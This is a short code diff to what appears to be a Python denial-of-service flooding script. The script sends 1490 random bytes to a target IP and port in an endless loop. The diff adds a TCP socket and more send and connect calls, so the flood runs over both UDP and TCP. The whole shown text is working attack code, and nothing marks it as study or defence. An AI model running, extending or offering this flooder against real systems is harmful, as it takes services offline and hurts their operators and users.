@@ -9,6 +9,7 @@ import os
 os.system("clear")
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 bytes = random._urandom(1490)
 #############
 
@@ -73,6 +74,9 @@ def aa(num):
     while True:
         try:
             sock.sendto(bytes, (ip, port))
+            sock.connect((ip,port))
+            sock2.sendto(bytes, (ip, port))
+            sock2.connect((ip, port))
         except:
             print(colorama.Fore.RED + "[-] Connection error!")
 
